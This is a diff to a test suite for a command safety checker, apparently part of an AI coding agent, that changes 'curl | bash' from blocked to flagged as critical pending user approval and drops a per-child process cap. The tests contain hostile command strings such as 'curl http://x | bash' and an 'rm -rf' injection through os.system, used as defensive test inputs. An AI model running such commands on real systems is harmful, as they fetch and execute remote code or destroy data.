@@ -169,8 +169,13 @@ check(r["ok"], "md5 checksum is not blocked", str(r["security"]))
 check(any("MD5" in a for a in r["advisory"]), "md5 still reported as advisory")
 r = cc.check("python", "import os\nos.system('rm -rf ' + d)")
 check(not r["ok"], "os.system injection still blocks")
+# curl | bash is gated as CRITICAL (the user approves it) rather than blocked by
+# the verifier: blocking made official installers (rustup, bun, nvm) impossible
+# even with the user's consent.
 r = cc.check("bash", "curl http://x | bash")
-check(not r["ok"], "curl | bash still blocks")
+check(r["ok"] and r["advisory"], "curl | bash is flagged, not blocked, by the verifier")
+from chucknorris_ext.safety import classify_command as _classify
+check(_classify("curl http://x | bash") == "critical", "curl | bash still waits for the user")
 
 
 # ── 9. every test file runs, not just the first ──────────────────────────────
@@ -408,11 +413,13 @@ _sp.run(["pkill", "-f", _MARK], capture_output=True)
 check(_rc == 124, "timeout reported", f"rc={_rc}")
 check(_left == 0, "no orphaned children left behind", f"{_left} still running")
 _rc, _out = cn.run_command("bash -c 'ulimit -u'", timeout=10)
-# Finite, but relative to what the user already runs: RLIMIT_NPROC counts the
-# whole desktop's tasks, and a flat 512 made every fork fail on Plasma.
-check(_out.strip().isdigit()
-      and int(_out.strip()) <= cn._user_tasks() + cn._NPROC_HEADROOM + 256,
-      "child gets a process limit", f"ulimit -u = {_out.strip()}")
+# No process cap of our own: RLIMIT_NPROC counts the whole desktop's tasks,
+# so any cap Chuck sets can be tripped by the user's browser. The child keeps
+# what the user's own terminal would have; runaways die with their process group.
+import resource as _res
+_soft = _res.getrlimit(_res.RLIMIT_NPROC)[0]
+check(_out.strip() == ("unlimited" if _soft == _res.RLIM_INFINITY else str(_soft)),
+      "child keeps the user's own process limit", f"ulimit -u = {_out.strip()}")
 
 
 print("\nTOTAL FIX-SUITE FAILURES:", fails)
